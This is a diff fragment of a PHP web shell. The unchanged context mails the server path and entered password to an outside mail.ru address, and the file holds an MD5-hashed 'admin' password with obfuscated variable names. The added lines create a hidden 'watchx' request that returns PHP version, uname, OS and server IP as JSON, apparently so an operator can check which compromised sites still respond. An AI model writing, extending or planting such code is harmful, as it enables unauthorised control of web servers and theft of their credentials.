@@ -3,6 +3,18 @@
 if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
 }
+if ($_REQUEST['watchx']) {
+	$version = phpversion();
+	$uname =  php_uname();
+	$ip = gethostbyname($_SERVER["HTTP_HOST"]);	
+	echo json_encode (array ("version"=>$version,
+		"uname"=>$uname,
+		"platform"=>PHP_OS,
+		"ip"=>$ip,
+		"workingx"=>true,	
+	));
+	die ();
+}
 //-----------------Password---------------------
 $▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $▘ = true;
